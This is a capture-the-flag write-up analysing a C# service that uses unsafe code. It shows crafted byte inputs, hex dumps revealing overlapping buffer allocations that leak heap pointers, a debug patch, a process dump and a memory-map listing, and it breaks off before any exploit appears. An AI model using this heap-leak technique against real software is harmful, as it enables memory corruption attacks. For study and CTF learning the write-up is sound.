# Day 8 - Unmanaged - pwn, dotnet

> I've made a Byte Buffer as a Service (BBAAS)! The service is written in C#, but to avoid performance penalties, we use unsafe code which should have comparable performance to C++!

Service: nc 3.93.128.89 1208

Download: [2866025a296e5848546641124cb75f1b760959b6291661d134a14e5379c54a6e-dist.zip](https://advent2019.s3.amazonaws.com/2866025a296e5848546641124cb75f1b760959b6291661d134a14e5379c54a6e-dist.zip)

Mirror: [dist.zip](static/2866025a296e5848546641124cb75f1b760959b6291661d134a14e5379c54a6e-dist.zip)

## Initial Analysis

Looking at the challenge, we have the source code for a CSharp application, but many of the functions are marked as "unsafe". I was not familiar with compiled CSharp, nor exactly how the memory is allocated so this took a bit of work to work through the learning curve. To start, using the suggested docker container, I setup an image to work in:

```
$ docker run -it -v `pwd`:/day8 mcr.microsoft.com/dotnet/core/sdk:3.0
```

One of the things I installed in the container a bit later was `dotnet-dump`. This turns out to be an immensely valuable tool for analyzing heap memory - something we'll have to do a lot of later. To install I used the existing `dotnet` utility:

```
root@7d0b1c83814a:/# dotnet-dump
bash: dotnet-dump: command not found
root@7d0b1c83814a:/# dotnet tool install -g dotnet-dump
Tools directory '/root/.dotnet/tools' is not currently on the PATH environment variable.
If you are using bash, you can add it to your profile by running the following command:

cat << \EOF >> ~/.bash_profile
# Add .NET Core SDK tools
export PATH="$PATH:/root/.dotnet/tools"
EOF

You can add it to the current session by running the following command:

export PATH="$PATH:/root/.dotnet/tools"

You can invoke the tool using the following command: dotnet-dump
Tool 'dotnet-dump' (version '3.1.57502') was successfully installed.
root@7d0b1c83814a:/# export PATH="$PATH:/root/.dotnet/tools"
```

Getting the binary up and running was relatively simple - just build and then run it. For this example, I just ran a couple simple commands - 3 new, 1 read, 1 write, and 2 read. As you can see this works and the output is some raw heap memory with a bunch of interesting data structures. Also, it looks like some of the memory allocations can return overlapping data so we likely can read and write heap structures from other `FastByteArray` objects.

```
root@7d0b1c83814a:/day8/dist# dotnet build -c Release
Microsoft (R) Build Engine version 16.3.2+e481bbf88 for .NET Core
Copyright (C) Microsoft Corporation. All rights reserved.

  Restore completed in 23.83 ms for /day8/dist/pwn2.csproj.
  pwn2 -> /day8/dist/bin/Release/netcoreapp3.0/pwn2.dll

Build succeeded.
    0 Warning(s)
    0 Error(s)

Time Elapsed 00:00:01.39
root@7d0b1c83814a:/day8/dist# echo -n -e '\x01\x20\x01\x1f\x01\x1e\x02\x00\x00\xf0\x03\x01\x00\x04AAAA\x02\x01\x00\xf0\x02\x02\x00\xf0' | ./bin/Release/netcoreapp3.0/pwn2 | xxd
00000000: c476 12d3 87b3 d998 3692 223b 06c5 9998  .v......6.";....
00000010: 62fc 3987 06d0 805a 48dc 8d3a 6106 dd13  b.9....ZH..:a...
00000020: 0000 0000 0000 0000 e8a2 0bfe 557f 0000  ............U...
00000030: 6090 00d8 557f 0000 2600 0000 0400 0000  `...U...&.......
00000040: 0000 0000 0000 0000 e8a2 0bfe 557f 0000  ............U...
00000050: e08d 00d8 557f 0000 0100 0000 1600 0000  ....U...........
00000060: 0000 0000 0000 0000 70d4 fdfd 557f 0000  ........p...U...
00000070: 3800 0000 0000 0000 0000 0000 4d43 246c  8...........MC$l
00000080: 507c 583c 4181 2f41 bde7 a748 de52 d32c  P|X<A./A...H.R.,
00000090: 3720 b332 a6cd 833d 76ea ea76 a749 3104  7 .2...=v..v.I1.
000000a0: f52e 9f7b 877c ce79 bf3e bb49 158f 8022  ...{.|.y.>.I..."
000000b0: b1bf 8541 ba5c e53d 82dc 0b60 39e7 f364  ...A.\.=...`9..d
000000c0: 52ec b16e cc42 9262 669b 9313 ca78 e83d  R..n.B.bf....x.=
000000d0: 958c 9837 f4d1 b61d 9735 8c08 2f5c 4d70  ...7.....5../\Mp
000000e0: 3cad 782a 728e 8c73 12e5 8835 56e6 180a  <.x*r..s...5V...
000000f0: 4141 4141 6371 41db e6df 2864 8428 bd3d  AAAAcqA...(d.(.=
00000100: ccdc 8e0a a197 bef4 f6b8 8aaa 269e 3600  ............&.6.
00000110: 0000 0000 0000 0000 c014 fbfd 557f 0000  ............U...
00000120: 0100 0000 0000 0000 0100 0000 0000 0000  ................
00000130: 0000 0000 0000 0000 c014 fbfd 557f 0000  ............U...
00000140: 0100 0000 0000 0000 1e00 0000 0000 0000  ................
00000150: 0000 0000 0000 0000 8812 0bfe 557f 0000  ............U...
00000160: 7892 00d8 557f 0000 0000 0000 0000 0000  x...U...........
00000170: c014 fbfd 557f 0000 1e00 0000 0000 0000  ....U...........
00000180: 30b5 0fb4 7070 c735 f0ba 5ea1 27a8 1cd6  0...pp.5..^.'...
00000190: 201e 506e 8577 d271 efd7 61db abe7 0000   .Pn.w.q..a.....
000001a0: 0000 0000 0000 0000 c014 fbfd 557f 0000  ............U...
000001b0: 0100 0000 0000 0000 0200 0000 0000 0000  ................
000001c0: 0000 0000 0000 0000 c014 fbfd 557f 0000  ............U...
000001d0: 0100 0000 0000 0000 0000 0000 0000 0000  ................
000001e0: 30b5 0fb4 7070 c735 f0ba 5ea1 27a8 1cd6  0...pp.5..^.'...
000001f0: 201e 506e 8577 d271 efd7 61db abe7 0000   .Pn.w.q..a.....
00000200: 0000 0000 0000 0000 c014 fbfd 557f 0000  ............U...
00000210: 0100 0000 0000 0000 0200 0000 0000 0000  ................
00000220: 0000 0000 0000 0000 c014 fbfd 557f 0000  ............U...
00000230: 0100 0000 0000 0000 0000 0000 0000 0000  ................
00000240: 0000 0000 0000 0000 c014 fbfd 557f 0000  ............U...
00000250: 0100 0000 0000 0000 0000 0000 0000 0000  ................
00000260: 0000 0000 0000 0000 c014 fbfd 557f 0000  ............U...
00000270: 0100 0000 0000 0000 f000 0000 0000 0000  ................
00000280: 0000 0000 0000 0000 c821 fbfd 557f 0000  .........!..U...
00000290: 1000 0000 0000 0000 f835 0bfe 557f 0000  .........5..U...
000002a0: 19b9 0bfe 557f 0000 0000 0000 0000 0000  ....U...........
000002b0: c014 fbfd 557f 0000 0100 0000 0000 0000  ....U...........
000002c0: c400 0000 0000 0000 0000 0000 0000 0000  ................
```

The only commands allowed in this binary are `Add`, `Write`, and `Read` so we know that the solution will likely end up being some sort of memory read or write. To that end, we'll start analyzing how these work.

## Analyzing Memory

To analyze things a little better, I modified the program slightly be adding a new command for byte "0". Altering the program will likely alter the heap structure somewhat, but we'll deal with those discrepancies later.

```csharp
root@7d0b1c83814a:/day8# diff dist/Program.cs dist_test/Program.cs 
3a4
> using System.Threading;
37a39,55
>             else if (action == 0)
>             {
>                 arrays[0].Print(0);
>                 arrays[0].Write(0, 0xf0, writer);
>                 arrays[1].Print(1);
>                 arrays[1].Write(0, 0xf0, writer);
>                 arrays[2].Print(2);
>                 arrays[2].Write(0, 0xf0, writer);
>                 arrays[3].Print(3);
>                 arrays[3].Write(0, 0xf0, writer);
>                 arrays[4].Print(4);
>                 arrays[4].Write(0, 0xf0, writer);
>                 arrays[5].Print(5);
>                 arrays[5].Write(0, 0xf0, writer);
> 
>                 Thread.Sleep(100*1000);
>             }
72a91,98
>         }
>     }
> 
>     public unsafe void Print(byte index)
>     {
>         fixed (byte* b = bytes)
>         {
>             Console.WriteLine("arrays[{0:d}].bytes = {1:x}\n", index, (long)b);
```

After compiling, I ran this with six allocations, paused execution and made it a background process (thanks to the sleep it kept running longer than I needed), and ran some `dotnet-dump` commands. First off, I listed the process id and dumped the memory:

```
root@7d0b1c83814a:/day8/dist_test# echo -n -e '\x01\x20\x01\x1f\x01\x1e\x01\x1d\x01\x1c\x01\x1b\x00' | ./bin/Release/netcoreapp3.0/pwn2 2>/dev/null | xxd
00000000: 6172 7261 7973 5b30 5d2e 6279 7465 7320  arrays[0].bytes 
00000010: 3d20 3766 3961 6438 3030 3864 6430 0a0a  = 7f9ad8008dd0..
00000020: a8da 82ef d304 c583 d394 89f3 34e0 de6a  ............4..j
00000030: a3c8 9e08 45c3 3592 bd32 feec 6e4b 9d27  ....E.5..2..nK.'
00000040: 0000 0000 0000 0000 a0ab e4fd 9a7f 0000  ................
00000050: b890 00d8 9a7f 0000 0c00 0000 2100 0000  ............!...
00000060: 0000 0000 0000 0000 a0ab e4fd 9a7f 0000  ................
00000070: 388e 00d8 9a7f 0000 0100 0000 1600 0000  8...............
00000080: 0000 0000 0000 0000 70d4 d6fd 9a7f 0000  ........p.......
00000090: 3800 0000 0000 0000 0000 0000 454f 411d  8...........EOA.
000000a0: ae91 cc64 a593 131b b989 2671 9971 b34b  ...d......&q.q.K
000000b0: 2b7d 311d 9a7d c139 f2f1 275f 9ebc a871  +}1..}.9..'_...q
000000c0: c4db ce25 e980 f74e faa1 fe5d 1e7f 9d47  ...%...N...]...G
000000d0: da2a 535a 2bf0 6946 17c9 d137 2101 ff38  .*SZ+.iF...7!..8
000000e0: 7300 c94f e97c cb5a 171b 7b62 75e9 6b51  s..O.|.Z..{bu.kQ
000000f0: f96e 5368 432b d62f c7bd 046c 477d bf46  .nShC+./...lG}.F
00000100: 69a7 7422 2779 9454 de9b f975 cd3c 1e0b  i.t"'y.T...u.<..
00000110: 6172 7261 7973 5b31 5d2e 6279 7465 7320  arrays[1].bytes 
00000120: 3d20 3766 3961 6438 3030 3932 3530 0a0a  = 7f9ad8009250..
00000130: 31d4 9b36 f894 47dd c41a 145a 2ff9 3c16  1..6..G....Z/.<.
00000140: 844e a788 abc8 13e5 a4f0 31a1 06d9 1400  .N........1.....
00000150: 0000 0000 0000 0000 c014 d4fd 9a7f 0000  ................
00000160: 0100 0000 0000 0000 0100 0000 0000 0000  ................
00000170: 0000 0000 0000 0000 c014 d4fd 9a7f 0000  ................
00000180: 0100 0000 0000 0000 1e00 0000 0000 0000  ................
00000190: 0000 0000 0000 0000 a012 e4fd 9a7f 0000  ................
000001a0: d092 00d8 9a7f 0000 0000 0000 0000 0000  ................
000001b0: c014 d4fd 9a7f 0000 1e00 0000 0000 0000  ................
000001c0: 88f6 62c1 5f45 a872 0f81 c044 2bae db62  ..b._E.r...D+..b
000001d0: c3f5 e867 20a4 157b 68c0 b591 0862 0000  ...g ..{h....b..
000001e0: 0000 0000 0000 0000 c014 d4fd 9a7f 0000  ................
000001f0: 0100 0000 0000 0000 0100 0000 0000 0000  ................
00000200: 0000 0000 0000 0000 c014 d4fd 9a7f 0000  ................
00000210: 0100 0000 0000 0000 1d00 0000 0000 0000  ................
00000220: 6172 7261 7973 5b32 5d2e 6279 7465 7320  arrays[2].bytes 
00000230: 3d20 3766 3961 6438 3030 3932 6530 0a0a  = 7f9ad80092e0..
00000240: 88f6 62c1 5f45 a872 0f81 c044 2bae db62  ..b._E.r...D+..b
00000250: c3f5 e867 20a4 157b 68c0 b591 0862 0000  ...g ..{h....b..
00000260: 0000 0000 0000 0000 c014 d4fd 9a7f 0000  ................
00000270: 0100 0000 0000 0000 0100 0000 0000 0000  ................
00000280: 0000 0000 0000 0000 c014 d4fd 9a7f 0000  ................
00000290: 0100 0000 0000 0000 1d00 0000 0000 0000  ................
000002a0: 0000 0000 0000 0000 a012 e4fd 9a7f 0000  ................
000002b0: 6093 00d8 9a7f 0000 0000 0000 0000 0000  `...............
000002c0: c014 d4fd 9a7f 0000 1d00 0000 0000 0000  ................
000002d0: a6d7 ea05 8c64 cd38 ddd1 dcdc 9707 eb84  .....d.8........
000002e0: e836 c88d 6dab 1d71 f3e3 e0e6 5800 0000  .6..m..q....X...
000002f0: 0000 0000 0000 0000 c014 d4fd 9a7f 0000  ................
00000300: 0100 0000 0000 0000 0100 0000 0000 0000  ................
00000310: 0000 0000 0000 0000 c014 d4fd 9a7f 0000  ................
00000320: 0100 0000 0000 0000 1c00 0000 0000 0000  ................
00000330: 6172 7261 7973 5b33 5d2e 6279 7465 7320  arrays[3].bytes 
00000340: 3d20 3766 3961 6438 3030 3933 3730 0a0a  = 7f9ad8009370..
00000350: a6d7 ea05 8c64 cd38 ddd1 dcdc 9707 eb84  .....d.8........
00000360: e836 c88d 6dab 1d71 f3e3 e0e6 5800 0000  .6..m..q....X...
00000370: 0000 0000 0000 0000 c014 d4fd 9a7f 0000  ................
00000380: 0100 0000 0000 0000 0100 0000 0000 0000  ................
00000390: 0000 0000 0000 0000 c014 d4fd 9a7f 0000  ................
000003a0: 0100 0000 0000 0000 1c00 0000 0000 0000  ................
000003b0: 0000 0000 0000 0000 a012 e4fd 9a7f 0000  ................
000003c0: f093 00d8 9a7f 0000 0000 0000 0000 0000  ................
000003d0: c014 d4fd 9a7f 0000 1c00 0000 0000 0000  ................
000003e0: 9e8f 1669 acdb e859 2522 7695 8b18 178b  ...i...Y%"v.....
000003f0: 440c 0e90 e4d8 7fc8 7af4 faba 0000 0000  D.......z.......
00000400: 0000 0000 0000 0000 4842 e4fd 9a7f 0000  ........HB......
00000410: 0800 0000 0000 0000 a88d 00d8 9a7f 0000  ................
00000420: 2892 00d8 9a7f 0000 b892 00d8 9a7f 0000  (...............
00000430: 4893 00d8 9a7f 0000 d893 00d8 9a7f 0000  H...............
00000440: 6172 7261 7973 5b34 5d2e 6279 7465 7320  arrays[4].bytes 
00000450: 3d20 3766 3961 6438 3030 3934 3030 0a0a  = 7f9ad8009400..
00000460: 9e8f 1669 acdb e859 2522 7695 8b18 178b  ...i...Y%"v.....
00000470: 440c 0e90 e4d8 7fc8 7af4 faba 0000 0000  D.......z.......
00000480: 0000 0000 0000 0000 4842 e4fd 9a7f 0000  ........HB......
00000490: 0800 0000 0000 0000 a88d 00d8 9a7f 0000  ................
000004a0: 2892 00d8 9a7f 0000 b892 00d8 9a7f 0000  (...............
000004b0: 4893 00d8 9a7f 0000 d893 00d8 9a7f 0000  H...............
000004c0: c094 00d8 9a7f 0000 0000 0000 0000 0000  ................
000004d0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000004e0: c014 d4fd 9a7f 0000 0100 0000 0000 0000  ................
000004f0: 0100 0000 0000 0000 0000 0000 0000 0000  ................
00000500: c014 d4fd 9a7f 0000 0100 0000 0000 0000  ................
00000510: 1b00 0000 0000 0000 0000 0000 0000 0000  ................
00000520: a012 e4fd 9a7f 0000 d894 00d8 9a7f 0000  ................
00000530: 0000 0000 0000 0000 c014 d4fd 9a7f 0000  ................
00000540: 1b00 0000 0000 0000 7912 a883 e6df 3e41  ........y.....>A
00000550: 6172 7261 7973 5b35 5d2e 6279 7465 7320  arrays[5].bytes 
00000560: 3d20 3766 3961 6438 3030 3934 6538 0a0a  = 7f9ad80094e8..
00000570: 7912 a883 e6df 3e41 c572 ea2c 032a c214  y.....>A.r.,.*..
00000580: 52f8 e192 06e6 aed7 d256 7300 0000 0000  R........Vs.....
00000590: 0000 0000 0000 0000 c014 d4fd 9a7f 0000  ................
000005a0: 0100 0000 0000 0000 0000 0000 0000 0000  ................
000005b0: 0000 0000 0000 0000 900f d4fd 9a7f 0000  ................
000005c0: 1c00 0000 6100 7200 7200 6100 7900 7300  ....a.r.r.a.y.s.
000005d0: 5b00 7b00 3000 3a00 6400 7d00 5d00 2e00  [.{.0.:.d.}.]...
000005e0: 6200 7900 7400 6500 7300 2000 3d00 2000  b.y.t.e.s. .=. .
000005f0: 7b00 3100 3a00 7800 7d00 0a00 0000 0000  {.1.:.x.}.......
00000600: 0000 0000 0000 0000 4883 d3fd 9a7f 0000  ........H.......
00000610: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000620: 68b4 d3fd 9a7f 0000 d08d 00d8 9a7f 0000  h...............
00000630: 0000 0000 0000 0000 98c7 2bfd 9a7f 0000  ..........+.....
00000640: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000650: 4041 f9fd 9a7f 0000 0000 0000 0000 0000  @A..............

root@7d0b1c83814a:/day8/dist_test# ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.0   3984  3348 pts/0    Ss   Dec19   0:00 bash
root      1877  0.0  0.0   3988  3256 pts/1    Ss+  Dec22   0:00 /bin/bash
root      2992  0.8  0.9 17833452 97744 pts/0  SLl  06:06   0:01 /usr/share/dotnet/dotnet exec /usr/share/dotnet/sdk/3.0.101/Roslyn/bincore/VBCSCompiler.dll -pipename:4y2S00ygjxeG0zs0E_XMjc2SchKVQZUHIOAmplcC920
root      3190  0.8  0.2 2894920 24396 pts/0   SLl  06:09   0:00 ./bin/Release/netcoreapp3.0/pwn2
root      3191  0.0  0.0   2280   684 pts/0    S    06:09   0:00 xxd
root      3200  0.0  0.0   7636  2740 pts/0    R+   06:09   0:00 ps aux

root@7d0b1c83814a:/day8/dist_test# dotnet-dump collect --process-id 3190
Writing minidump with heap to /day8/dist_test/core_20191229_060948
00000660: 5772 6974 696e 6720 6d69 6e69 6475 6d70  Writing minidump
00000670: 2077 6974 6820 6865 6170 2074 6f20 6669   with heap to fi
00000680: 6c65 202f 6461 7938 2f64 6973 745f 7465  le /day8/dist_te
00000690: 7374 2f63 6f72 655f 3230 3139 3132 3239  st/core_20191229
000006a0: 5f30 3630 3934 380a 5772 6974 7465 6e20  _060948.Written 
000006b0: 3630 3833 3337 3932 2062 7974 6573 2028  60833792 bytes (
000006c0: 3134 3835 3220 7061 6765 7329 2074 6f20  14852 pages) to 
Complete
```

I also took note of the memory mappings in the current process. But really, this doesn't tell us much yet:

```
root@7d0b1c83814a:/day8/dist_test# cat /proc/3190/maps 
00400000-00414000 r-xp 00000000 00:4d 19641301                           /day8/dist_test/bin/Release/netcoreapp3.0/pwn2
00613000-00614000 r--p 00013000 00:4d 19641301                           /day8/dist_test/bin/Release/netcoreapp3.0/pwn2
00614000-00615000 rw-p 00014000 00:4d 19641301                           /day8/dist_test/bin/Release/netcoreapp3.0/pwn2
009a3000-00c33000 rw-p 00000000 00:00 0                                  [heap]
7f9ac0000000-7f9ac0021000 rw-p 00000000 00:00 0 
7f9ac0021000-7f9ac4000000 ---p 00000000 00:00 0 
7f9ac4000000-7f9ac4021000 rw-p 00000000 00:00 0 
7f9ac4021000-7f9ac8000000 ---p 00000000 00:00 0 
7f9ac8000000-7f9ac8021000 rw-p 00000000 00:00 0 
7f9ac8021000-7f9acc000000 ---p 00000000 00:00 0 
7f9acc000000-7f9acc021000 rw-p 00000000 00:00 0 
7f9acc021000-7f9ad0000000 ---p 00000000 00:00 0 
7f9ad0000000-7f9ad0021000 rw-p 00000000 00:00 0 
7f9ad0021000-7f9ad4000000 ---p 00000000 00:00 0 
7f9ad7ffe000-7f9ad8020000 rw-p 00000000 00:00 0 
7f9ad8020000-7f9ae7ffe000 ---p 00000000 00:00 0 
7f9ae7ffe000-7f9ae8010000 rw-p 00000000 00:00 0 
7f9ae8010000-7f9af0000000 ---p 00000000 00:00 0 
7f9af0000000-7f9af0021000 rw-p 00000000 00:00 0 
7f9af0021000-7f9af4000000 ---p 00000000 00:00 0 
7f9af4000000-7f9af4021000 rw-p 00000000 00:00 0 
7f9af4021000-7f9af8000000 ---p 00000000 00:00 0 
7f9af8000000-7f9af8021000 rw-p 00000000 00:00 0 
7f9af8021000-7f9afc000000 ---p 00000000 00:00 0 
7f9afd297000-7f9afd2b0000 ---p 00000000 00:00 0 
7f9afd2b0000-7f9afd2b1000 rw-p 00000000 00:00 0 
7f9afd2b1000-7f9afd2b3000 ---p 00000000 00:00 0 
7f9afd2b3000-7f9afd2b4000 rwxp 00000000 00:00 0 
7f9afd2b4000-7f9afd2bd000 rw-p 00000000 00:00 0 
7f9afd2bd000-7f9afd2be000 rwxp 00000000 00:00 0 
7f9afd2be000-7f9afd2c0000 ---p 00000000 00:00 0 
7f9afd2c0000-7f9afd2c1000 rw-p 00000000 00:00 0 
7f9afd2c1000-7f9afd2c6000 ---p 00000000 00:00 0 
7f9afd2c6000-7f9afd2c7000 rw-p 00000000 00:00 0 
7f9afd2c7000-7f9afd2cf000 ---p 00000000 00:00 0 
7f9afd2cf000-7f9afd2d0000 rwxp 00000000 00:00 0 
7f9afd2d0000-7f9afd2d3000 ---p 00000000 00:00 0 
7f9afd2d3000-7f9afd2d4000 rwxp 00000000 00:00 0 
7f9afd2d4000-7f9afd304000 ---p 00000000 00:00 0 
7f9afd304000-7f9afd305000 rwxp 00000000 00:00 0 
7f9afd305000-7f9afd35b000 ---p 00000000 00:00 0 
7f9afd35b000-7f9afd35c000 rwxp 00000000 00:00 0 
7f9afd35c000-7f9afd360000 ---p 00000000 00:00 0 
7f9afd360000-7f9afd361000 r--p 00000000 08:01 170668                     /usr/share/dotnet/shared/Microsoft.NETCore.App/3.0.1/System.Private.CoreLib.dll
7f9afd361000-7f9afd370000 ---p 00000000 00:00 0 
7f9afd370000-7f9afd394000 rw-p 00000000 08:01 170668                     /usr/share/dotnet/shared/Microsoft.NETCore.App/3.0.1/System.Private.CoreLib.dll
7f9afd394000-7f9afd3a3000 ---p 00000000 00:00 0 
7f9afd3a3000-7f9afdc34000 r-xp 00023000 08:01 170668                     /usr/share/dotnet/shared/Microsoft.NETCore.App/3.0.1/System.Private.CoreLib.dll
7f9afdc34000-7f9afdc43000 ---p 00000000 00:00 0 
7f9afdc43000-7f9afdc4a000 r--p 008b3000 08:01 170668                     /usr/share/dotnet/shared/Microsoft.NETCore.App/3.0.1/System.Private.CoreLib.dll
7f9afdc4a000-7f9afdc50000 ---p 00000000 00:00 0 
7f9afdc50000-7f9afdc8f000 rw-p 00000000 00:00 0 
7f9afdc8f000-7f9afdc90000 ---p 00000000 00:00 0 
7f9afdc90000-7f9afdcb0000 rw-p 00000000 00:00 0 
7f9afdcb0000-7f9afdcca000 rwxp 00000000 00:00 0 
7f9afdcca000-7f9afdd30000 ---p 00000000 00:00 0 
7f9afdd30000-7f9afdd50000 rw-p 00000000 00:00 0 
7f9afdd50000-7f9afdd60000 rw-p 00000000 00:00 0 
7f9afdd60000-7f9afdd70000 rw-p 00000000 00:00 0 
7f9afdd70000-7f9afdd71000 r--p 00000000 08:01 170702                     /usr/share/dotnet/shared/Microsoft.NETCore.App/3.0.1/System.Runtime.dll
7f9afdd71000-7f9afdd80000 ---p 00000000 00:00 0 
7f9afdd80000-7f9afdd81000 rw-p 00000000 08:01 170702                     /usr/share/dotnet/shared/Microsoft.NETCore.App/3.0.1/System.Runtime.dll
7f9afdd81000-7f9afdd90000 ---p 00000000 00:00 0 
7f9afdd90000-7f9afdd9b000 r-xp 00000000 08:01 170702                     /usr/share/dotnet/shared/Microsoft.NETCore.App/3.0.1/System.Runtime.dll
7f9afdd9b000-7f9afddaa000 ---p 00000000 00:00 0 
7f9afddaa000-7f9afddab000 r--p 0000a000 08:01 170702                     /usr/share/dotnet/shared/Microsoft.NETCore.App/3.0.1/System.Runtime.dll
7f9afddab000-7f9afddb0000 ---p 00000000 00:00 0 
7f9afddb0000-7f9afddc0000 rw-p 00000000 00:00 0 
7f9afddc0000-7f9afddd0000 rw-p 00000000 00:00 0 
7f9afddd0000-7f9afddd1000 r--p 00000000 08:01 170687                     /usr/share/dotnet/shared/Microsoft.NETCore.App/3.0.1/System.Runtime.Extensions.dll
7f9afddd1000-7f9afdde0000 ---p 00000000 00:00 0 
7f9afdde0000-7f9afdde2000 rw-p 00000000 08:01 170687                     /usr/share/dotnet/shared/Microsoft.NETCore.App/3.0.1/System.Runtime.Extensions.dll
7f9afdde2000-7f9afddf1000 ---p 00000000 00:00 0 
7f9afddf1000-7f9afde21000 r-xp 00001000 08:01 170687                     /usr/share/dotnet/shared/Microsoft.NETCore.App/3.0.1/System.Runtime.Extensions.dll
7f9afde21000-7f9afde30000 ---p 00000000 00:00 0 
7f9afde30000-7f9afde31000 r--p 00030000 08:01 170687                     /usr/share/dotnet/shared/Microsoft.NETCore.App/3.0.1/System.Runtime.Extensions.dll
7f9afde31000-7f9afde40000 ---p 00000000 00:00 0 
7f9afde40000-7f9afde50000 rw-p 00000000 00:00 0 
7f9afde50000-7f9afde51000 r--p 00000000 08:01 170590                     /usr/share/dotnet/shared/Microsoft.NETCore.App/3.0.1/System.Collections.dll
7f9afde51000-7f9afde60000 ---p 00000000 00:00 0 
7f9afde60000-7f9afde63000 rw-p 00000000 08:01 170590                     /usr/share/dotnet/shared/Microsoft.NETCore.App/3.0.1/System.Collections.dll
7f9afde63000-7f9afde72000 ---p 00000000 00:00 0 
7f9afde72000-7f9afdec0000 r-xp 00002000 08:01 170590                     /usr/share/dotnet/shared/Microsoft.NETCore.App/3.0.1/System.Collections.dll
7f9afdec0000-7f9afded0000 ---p 00000000 00:00 0 
7f9afded0000-7f9afded1000 r--p 00050000 08:01 170590                     /usr/share/dotnet/shared/Microsoft.NETCore.App/3.0.1/System.Collections.dll
7f9afded1000-7f9afdee0000 ---p 00000000 00:00 0 
7f9afdee0000-7f9afdef0000 rw-p 00000000 00:00 0 
7f9afdef0000-7f9afdef1000 r--p 00000000 08:01 170598                     /usr/share/dotnet/shared/Microsoft.NETCore.App/3.0.1/System.Console.dll
7f9afdef1000-7f9afdf00000 ---p 00000000 00:00 0 
7f9afdf00000-7f9afdf02000 rw-p 00000000 08:01 170598                     /usr/share/dotnet/shared/Microsoft.NETCore.App/3.0.1/System.Console.dll
7f9afdf02000-7f9afdf11000 ---p 00000000 00:00 0 
7f9afdf11000-7f9afdf3c000 r-xp 00001000 08:01 170598                     /usr/share/dotnet/shared/Microsoft.NETCore.App/3.0.1/System.Console.dll
7f9afdf3c000-7f9afdf4b000 ---p 00000000 00:00 0 
7f9afdf4b000-7f9afdf4c000 r--p 0002b000 08:01 170598                     /usr/share/dotnet/shared/Microsoft.NETCore.App/3.0.1/System.Console.dll
7f9afdf4c000-7f9afdf50000 ---p 00000000 00:00 0 
7f9afdf50000-7f9afdf51000 r--p 00000000 08:01 170732                     /usr/share/dotnet/shared/Microsoft.NETCore.App/3.0.1/System.Threading.Thread.dll
7f9afdf51000-7f9afdf60000 ---p 00000000 00:00 0 
7f9afdf60000-7f9afdf61000 rw-p 00000000 08:01 170732                     /usr/share/dotnet/shared/Microsoft.NETCore.App/3.0.1/System.Threading.Thread.dll
7f9afdf61000-7f9afdf70000 ---p 00000000 00:00 0 
7f9afdf70000-7f9afdf72000 r-xp 00000000 08:01 170732                     /usr/share/dotnet/shared/Microsoft.NETCore.App/3.0.1/System.Threading.Thread.dll
7f9afdf72000-7f9afdf82000 ---p 00000000 00:00 0 
7f9afdf82000-7f9afdf83000 r--p 00002000 08:01 170732                     /usr/share/dotnet/shared/Microsoft.NETCore.App/3.0.1/System.Threading.Thread.dll
7f9afdf83000-7f9afdf90000 ---p 00000000 00:00 0 
7f9afdf90000-7f9afdfa0000 rw-p 00000000 00:00 0 
7f9afdfa0000-7f9afdfa1000 r--p 00000000 08:01 170735                     /usr/share/dotnet/shared/Microsoft.NETCore.App/3.0.1/System.Threading.dll
7f9afdfa1000-7f9afdfb0000 ---p 00000000 00:00 0 
7f9afdfb0000-7f9afdfb1000 rw-p 00000000 08:01 170735                     /usr/share/dotnet/shared/Microsoft.NETCore.App/3.0.1/System.Threading.dll
7f9afdfb1000-7f9afdfc0000 ---p 00000000 00:00 0 
7f9afdfc0000-7f9afdfd1000 r-xp 00000000 08:01 170735                     /usr/share/dotnet/shared/Microsoft.NETCore.App/3.0.1/System.Threading.dll
7f9afdfd1000-7f9afdfe0000 ---p 00000000 00:00 0 
7f9afdfe0000-7f9afdfe1000 r--p 00010000 08:01 170735                     /usr/share/dotnet/shared/Microsoft.NETCore.App/3.0.1/System.Threading.dll
7f9afdfe1000-7f9afdff0000 ---p 00000000 00:00 0 
7f9afdff0000-7f9afdff7000 rw-p 00000000 00:00 0 
7f9afdff7000-7f9afe000000 ---p 00000000 00:00 0 
7f9afe000000-7f9afe001000 r--p 00000000 08:01 170721                     /usr/share/dotnet/shared/Microsoft.NETCore.App/3.0.1/System.Text.Encoding.Extensions.dll
7f9afe001000-7f9afe010000 ---p 00000000 00:00 0 
7f9afe010000-7f9afe011000 rw-p 00000000 08:01 170721                     /usr/share/dotnet/shared/Microsoft.NETCore.App/3.0.1/System.Text.Encoding.Extensions.dll
7f9afe011000-7f9afe020000 ---p 00000000 00:00 0 
7f9afe020000-7f9afe022000 r-xp 00000000 08:01 170721                     /usr/share/dotnet/shared/Microsoft.NETCore.App/3.0.1/System.Text.Encoding.Extensions.dll
7f9afe022000-7f9afe040000 ---p 00000000 00:00 0 
7f9afe040000-7f9afe043000 rw-p 00000000 00:00 0 
7f9afe043000-7f9b6ee87000 ---p 00000000 00:00 0 
7f9b71382000-7f9b71383000 ---p 00000000 00:00 0 
7f9b71383000-7f9b713c3000 rw-p 00000000 00:00 0 
7f9b713c3000-7f9b713c4000 ---p 00000000 00:00 0 
7f9b713c4000-7f9b71bc4000 rw-p 00000000 00:00 0 
7f9b71bc4000-7f9b71ca1000 r--p 00000000 08:01 3959908                    /usr/lib/x86_64-linux-gnu/libicui18n.so.63.1
7f9b71ca1000-7f9b71e0b000 r-xp 000dd000 08:01 3959908                    /usr/lib/x86_64-linux-gnu/libicui18n.so.63.1
7f9b71e0b000-7f9b71e8c000 r--p 00247000 08:01 3959908                    /usr/lib/x86_64-linux-gnu/libicui18n.so.63.1
7f9b71e8c000-7f9b71e8d000 ---p 002c8000 08:01 3959908                    /usr/lib/x86_64-linux-gnu/libicui18n.so.63.1
7f9b71e8d000-7f9b71e9d000 r--p 002c8000 08:01 3959908                    /usr/lib/x86_64-linux-gnu/libicui18n.so.63.1
7f9b71e9d000-7f9b71e9e000 rw-p 002d8000 08:01 3959908                    /usr/lib/x86_64-linux-gnu/libicui18n.so.63.1
7f9b71e9e000-7f9b71e9f000 rw-p 00000000 00:00 0 
7f9b71e9f000-7f9b71ea0000 r--p 00000000 08:01 3959906                    /usr/lib/x86_64-linux-gnu/libicudata.so.63.1
7f9b71ea0000-7f9b71ea1000 r-xp 00001000 08:01 3959906                    /usr/lib/x86_64-linux-gnu/libicudata.so.63.1
